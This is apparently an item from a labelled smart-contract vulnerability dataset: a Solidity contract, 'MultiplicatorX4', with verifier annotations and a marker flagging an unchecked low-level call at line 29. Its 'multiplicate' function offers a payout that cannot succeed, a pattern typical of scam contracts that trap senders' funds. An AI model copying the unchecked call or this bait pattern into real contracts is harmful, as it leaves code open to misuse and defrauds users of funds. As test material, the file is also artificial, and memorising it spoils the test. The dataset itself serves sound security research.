/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 29
 */

pragma solidity >=0.7.0;

contract MultiplicatorX4
{
    address public Owner = msg.sender;
   
    /// @notice precondition msg.value >= 0
    /// @notice precondition address(this).balance >= 0
    /// @notice precondition forall (address addr2005) addr2005.balance >= 0
    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        payable(Owner).transfer(address(this).balance);
    }
    
    /// @notice precondition msg.value >= 0
    /// @notice precondition address(this).balance >= 0
    /// @notice precondition forall (address addr2005) addr2005.balance >= 0
    /// @notice precondition msg.sender == Owner
    /// @notice postcondition address(this).balance == __verifier_old_uint(address(this).balance) - msg.value
    function Command(address adr,bytes memory data)
    payable
    public
    {
        require(msg.sender == Owner);
        // <yes> <report> UNCHECKED_LL_CALLS
        adr.call{value: msg.value}(data);
    }
    
    /// @notice precondition msg.value >= 0
    /// @notice precondition address(this).balance >= 0
    /// @notice precondition forall (address addr2005) addr2005.balance >= 0
    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=address(this).balance)
        {        
            payable(adr).transfer(address(this).balance+msg.value);
        }
    }
}
